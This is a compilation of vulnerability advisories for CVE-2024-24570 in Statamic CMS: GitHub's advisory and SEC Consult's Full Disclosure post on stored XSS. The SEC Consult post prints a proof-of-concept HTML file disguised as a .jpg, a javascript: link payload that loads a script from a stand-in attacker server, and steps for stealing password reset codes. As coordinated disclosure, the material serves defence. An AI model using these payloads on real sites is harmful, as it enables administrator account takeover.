=== Content from github.com_7eef5e02_20250114_233330.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fstatamic%2Fcms%2Fsecurity%2Fadvisories%2FGHSA-vqxq-hvxw-9mv9)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fstatamic%2Fcms%2Fsecurity%2Fadvisories%2FGHSA-vqxq-hvxw-9mv9)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=statamic%2Fcms)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[statamic](/statamic)
/
**[cms](/statamic/cms)**
Public

* [Notifications](/login?return_to=%2Fstatamic%2Fcms) You must be signed in to change notification settings
* [Fork
  547](/login?return_to=%2Fstatamic%2Fcms)
* [Star
   4.2k](/login?return_to=%2Fstatamic%2Fcms)

* [Code](/statamic/cms)
* [Issues
  217](/statamic/cms/issues)
* [Pull requests
  50](/statamic/cms/pulls)
* [Discussions](/statamic/cms/discussions)
* [Actions](/statamic/cms/actions)
* [Projects
  0](/statamic/cms/projects)
* [Security](/statamic/cms/security)
* [Insights](/statamic/cms/pulse)

Additional navigation options

* [Code](/statamic/cms)
* [Issues](/statamic/cms/issues)
* [Pull requests](/statamic/cms/pulls)
* [Discussions](/statamic/cms/discussions)
* [Actions](/statamic/cms/actions)
* [Projects](/statamic/cms/projects)
* [Security](/statamic/cms/security)
* [Insights](/statamic/cms/pulse)

# Account takeover via XSS and password reset link

High

[jasonvarga](/jasonvarga)
published
GHSA-vqxq-hvxw-9mv9
Feb 1, 2024

## Package

composer

statamic/cms
([Composer](/advisories?query=ecosystem%3Acomposer))

## Affected versions

<4.46.0, <3.4.17

## Patched versions

4.46.0, 3.4.17

## Description

### Impact

HTML files crafted to look like jpg files are able to be uploaded, allowing for XSS.

This affects:

* front-end forms with asset fields without any mime type validation
* asset fields in the control panel
* asset browser in the control panel

Additionally, if the XSS is crafted in a specific way, the "copy password reset link" feature may be exploited to gain access to a user's password reset token and gain access to their account. The authorized user is required to execute the XSS in order for the vulnerability to occur.

### Patches

In versions 4.46.0 and 3.4.17, the XSS vulnerability has been patched, and the copy password reset link functionality has been disabled. (Users may still trigger password reset emails.)

### Credits

Statamic thanks Niklas Schilling (discovery, analysis, coordination) from the SEC Consult Vulnerability Lab (<https://www.sec-consult.com/>) for responsibly reporting the identified issues and working with us as we addressed them.

### Severity

High

8.2

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Network

Attack complexity
Low

Privileges required
None

User interaction
Required

Scope
Changed

Confidentiality
High

Integrity
Low

Availability
None

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N

### CVE ID

CVE-2024-24570

### Weaknesses

No CWEs

### Credits

* [![@sec-consult](https://avatars.githubusercontent.com/u/16082503?s=40&v=4)](/sec-consult)
  [sec-consult](/sec-consult)
  Analyst

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from packetstormsecurity.com_6b6a44c2_20250114_233322.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from seclists.org_312a376e_20250114_233326.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](16)
[By Date](date.html#17)
[![Next](/images/right-icon-16x16.png)](18)

[![Previous](/images/left-icon-16x16.png)](16)
[By Thread](index.html#17)
[![Next](/images/right-icon-16x16.png)](18)

![](/shared/images/nst-icons.svg#search)

# SEC Consult SA-20240212-0 :: Multiple Stored Cross-Site Scripting vulnerabilities in Statamic CMS

---

*From*: "SEC Consult Vulnerability Lab, Research via Fulldisclosure" <fulldisclosure () seclists org>

*Date*: Mon, 12 Feb 2024 06:49:35 +0000

---

```
SEC Consult Vulnerability Lab Security Advisory < 20240212-0 >
=======================================================================
               title: Multiple Stored Cross-Site Scripting vulnerabilities
             product: Statamic CMS
  vulnerable version: <4.46.0, <3.4.17
       fixed version: >=4.46.0, >=3.4.17
          CVE number: CVE-2024-24570
              impact: high
            homepage: <https://statamic.com/>
               found: 2024-01-06
                  by: Niklas Schilling (Office Munich)
                      SEC Consult Vulnerability Lab

                      An integrated part of SEC Consult, an Eviden business
                      Europe | Asia

                      <https://www.sec-consult.com>

=======================================================================

Vendor description:
-------------------
"Statamic is a modern, clean, and highly adaptable CMS built on Laravel
that can run full-stack, headless, on flat files or databases, or as a
static site generator."

Source: <https://statamic.com/>

Business recommendation:
------------------------
The vendor provides a patch which should be installed immediately. Furthermore,
an updated guideline for implementing a Content Security Policy (CSP) is
provided by the vendor.

SEC Consult highly recommends to perform a thorough security review of the
product conducted by security professionals to identify and resolve potential
further security issues.

Vulnerability overview/description:
-----------------------------------
1) Stored Cross-Site Scripting in Forms feature (CVE-2024-24570)
Statamic's Forms feature allows unauthenticated users to upload certain
filetypes. While only a limited number of file extensions are allowed, it's
possible to bypass these restrictions to upload an HTML file containing
JavaScript code.

2) Stored Cross-Site Scripting in Link Field
Statamic's Link Field feature provides authenticated users a convenient way
of inserting Hyperlinks into a collection's entry. It was identified that
it's possible to execute JavaScript code upon clicking on a specially
crafted Hyperlink.

Proof of concept:
-----------------
1) Stored Cross-Site Scripting in Forms feature (CVE-2024-24570)
When trying to upload an HTML file as an unauthenticated user, the
.html extension gets correctly detected by Statamic, leading to the file
being blocked from uploading.

This check can be bypassed though, by instead using a .jpg file extension,
as files of this type are allowed to be uploaded. Afterwards, the file's
content is analyzed by Statamic and correctly interpreted as HTML, resulting
in the initial .jpg extension being replaced with an .html extension. As no
checks on this newly set file extension are performed, the file is now shown
as a valid submission in Statamic's "Forms" page.

If an authenticated user accesses this submission, the included JavaScript
code will be executed. This can be verified by uploading a file called
"test.jpg" with the following content:

<!DOCTYPE html>
<html>
     <body>
         <script>alert("Stored XSS on "+window.origin)</script>
     </body>
</html>

To further demonstrate the criticality of this vulnerability, the following
JavaScript code can be used:

[ POC code removed from public advisory ]

When an admin user now accesses this JavaScript submission, the following happens:
1. Load the "Users" page in a hidden iframe and extract the CSRF token from it.
2. Request user information and extract the user ID and email address from
    the response.
3. Request a password reset code for the extracted used ID.
4. Extract the password reset code from the response and send it to the
    attacker server including the user's email address.

After receiving the victim's password reset code and email address,
the attacker can now visit the following URL and set a new password:
https://<STATAMIC_SERVER>/!/auth/password/reset/<PASSWORD_RESET_CODE>

This results in a successful takeover of the victim's account.

2) Stored Cross-Site Scripting in Link Field
When using a Link Field of type "URL", the following XSS payload can be used
as input:
javascript:var&#32;js=document.createElement(&#39;script&#39;);js.src=&#39;https://<ATTACKER_SERVER>/poc.js&#39;;document.body.append(js)

As this input is typically placed in the "href" attribute of an anchor tag,
the JavaScript pseudo protocol can be used to execute arbitrary JavaScript
code upon clicking on the Hyperlink. In this case the external file "poc.js"
will be loaded, which contains the JavaScript code from the password reset
code stealer above (removed from public advisory).

This way, an authenticated user with lower privileges can gain control over an
admin's account after the admin clicks on the malicious Hyperlink.

Statamic's "sanitize" modifier doesn't prevent this attack, as no illegal
characters are being used in the XSS payload:
<a href="{{ url_link | sanitize }}">Link</a>

Vulnerable / tested versions:
-----------------------------
The following version has been tested which was the latest version available
at the time of the test:
* 4.45.0

The following Statamic CMS versions are affected by this vulnerability:
* <4.46.0
* <3.4.17

Vendor contact timeline:
------------------------
2024-01-24: Contacting vendor through support () statamic com
2024-01-24: Vendor confirms receipt of advisory and states that they aim to
             resolve the issues within the next few days.
2024-01-26: Vendor fixes the first stored XSS and shares the corresponding
             GitHub security advisory draft. Furthermore, valid arguments for
             mitigating the second stored XSS via a correctly set CSP are
             supplied. Vendor also creates a new documentation page for
             setting the CSP in the correct areas.
2024-01-26: Confirming that setting a correctly configured CSP for the
             necessary areas results in a higher efficiency in mitigating the
             second security issue.
2024-01-29: Suggesting an adjustment of the assigned CVSS3.1 score that was
             set in the vendor's GitHub security advisory. Also asking for
             planned public disclosure and the assignment of a CVE number.
2024-01-29: Vendor adjusts CVSS3.1 score and suggests requesting a
             CVE number via GitHub.
2024-01-30: Received CVE number CVE-2024-24570.
2024-02-12: Coordinated release of advisory.

Solution:
---------
The vendor provided a patch for the "Stored Cross-Site Scripting in Forms" feature
(CVE-2024-24570):

* Update version "4.X" to "4.46.0" or later
* Update version "3.X" to "3.4.17" or later

Get the newest release of Statamic CMS here:
<https://github.com/statamic/cms/releases>

The vendor will not provide a patch regarding "Stored Cross-Site Scripting in
Link Field" but suggests to implement a correctly configured CSP as described
in Statamic's newly added documentation page:

<https://statamic.dev/tips/content-security-policy>

Vendor advisory:
<https://github.com/statamic/cms/security/advisories/GHSA-vqxq-hvxw-9mv9>

Workaround:
-----------
No workaround available.

Advisory URL:
-------------
<https://sec-consult.com/vulnerability-lab/>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

SEC Consult Vulnerability Lab
An integrated part of SEC Consult, an Eviden business
Europe | Asia

About SEC Consult Vulnerability Lab
The SEC Consult Vulnerability Lab is an integrated part of SEC Consult, an
Eviden business. It ensures the continued knowledge gain of SEC Consult in the
field of network and application security to stay ahead of the attacker. The
SEC Consult Vulnerability Lab supports high-quality penetration testing and
the evaluation of new offensive and defensive technologies for our customers.
Hence our customers obtain the most current information about vulnerabilities
and valid recommendation about the risk profile of new technologies.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Interested to work with the experts of SEC Consult?
Send us your application <https://sec-consult.com/career/>

Interested in improving your cyber security with the experts of SEC Consult?
Contact our local offices <https://sec-consult.com/contact/>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Mail: security-research at sec-consult dot com
Web: <https://www.sec-consult.com>
Blog: <https://blog.sec-consult.com>
Twitter: <https://twitter.com/sec_consult>

EOF Niklas Schilling / @2024
_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <https://seclists.org/fulldisclosure/>

```

---

[![Previous](/images/left-icon-16x16.png)](16)
[By Date](date.html#17)
[![Next](/images/right-icon-16x16.png)](18)

[![Previous](/images/left-icon-16x16.png)](16)
[By Thread](index.html#17)
[![Next](/images/right-icon-16x16.png)](18)

### Current thread:

* **SEC Consult SA-20240212-0 :: Multiple Stored Cross-Site Scripting vulnerabilities in Statamic CMS** *SEC Consult Vulnerability Lab, Research via Fulldisclosure (Feb 13)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")


